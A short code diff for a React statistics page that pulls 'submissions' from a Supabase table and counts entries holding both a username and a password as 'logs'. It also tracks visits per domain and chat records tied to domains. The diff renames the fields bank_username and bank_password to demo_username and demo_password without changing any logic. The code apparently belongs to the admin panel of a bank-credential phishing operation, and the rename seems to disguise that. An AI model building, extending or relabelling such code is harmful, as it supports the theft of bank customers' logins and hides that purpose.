@@ -6,7 +6,7 @@ import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@
 import { Badge } from "@/components/ui/badge";
 import { BarChart3, Globe, Send, Users, FileText, KeyRound, Eye } from "lucide-react";
 
-interface SubRow { domain: string | null; bank_username: string | null; bank_password: string | null; }
+interface SubRow { domain: string | null; demo_username: string | null; demo_password: string | null; }
 interface VisitRow { domain: string | null; }
 interface ChatRow { id: string; chat_id: string; label: string | null; domains: string[]; }
 
@@ -20,7 +20,7 @@ function StatisticsContent() {
       while (true) {
         const { data, error } = await supabase
           .from("submissions")
-          .select("domain,bank_username,bank_password")
+          .select("domain,demo_username,demo_password")
           .range(from, from + PAGE - 1);
         if (error) throw error;
         const rows = (data || []) as SubRow[];
@@ -65,7 +65,7 @@ function StatisticsContent() {
     },
   });
 
-  const isLog = (s: SubRow) => !!(s.bank_username && s.bank_password);
+  const isLog = (s: SubRow) => !!(s.demo_username && s.demo_password);
 
   const totals = useMemo(() => {
     const logs = submissions.filter(isLog).length;
